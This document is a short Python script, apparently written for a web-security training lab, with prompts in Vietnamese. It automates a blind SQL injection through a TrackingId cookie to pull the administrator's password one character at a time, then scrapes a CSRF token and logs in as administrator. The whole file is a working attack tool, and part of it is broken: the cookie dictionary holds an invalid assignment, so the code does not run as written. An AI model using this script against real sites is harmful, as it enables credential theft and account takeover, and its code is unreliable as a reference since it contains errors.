import requests
from bs4 import BeautifulSoup

url = input("Nhập URL: ").rstrip("/")

response = requests.get(url)

tracking_id = None
if 'Set-Cookie' in response.headers:
    cookies_header = response.headers['Set-Cookie']
    cookie_parts = cookies_header.split(';')
    for part in cookie_parts:
        if part.strip().startswith('TrackingId='):
            tracking_id = part.strip().split('=')[1]
            break

if tracking_id:
    print(f"TrackingId: {tracking_id}")

    charset = 'abcdefghijklmnopqrstuvwxyz.0123456789_ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()}{ ,'
    passw = ''
    sestp = input()
    for index in range(1, 21):
        found = False
        for c in charset:
            payload = f"{tracking_id}' AND (SELECT SUBSTRING(password,{index},1) FROM users WHERE username='administrator')='{c}"
            cookies = {
                "TrackingId": payload,
                session_cookie = response.cookies.get("session")
            }
            print("Đang test ký tự thứ ",index," :",c,end="\r")

            response2 = requests.get(url, cookies=cookies)

            if "Welcome" in response2.text:
                passw += c
                found = True
                print("\npass:", passw)
                break

        if not found:
            print("Not found")
            break

login_url = f"{url}/login"

session = requests.Session()
response = session.get(login_url)

if response.status_code != 200:
    print(f"Không thể truy cập {login_url}, mã lỗi: {response.status_code}")
    exit()

soup = BeautifulSoup(response.text, "html.parser")
csrf_token = soup.find("input", {"name": "csrf"})["value"]

data = {
    "csrf": csrf_token,
    "username": "administrator",
    "password": passw
}

response = session.post(login_url, data=data)
print(f"Request sent to: {login_url}")
if (response.status_code == 200):
    print("Login successful!")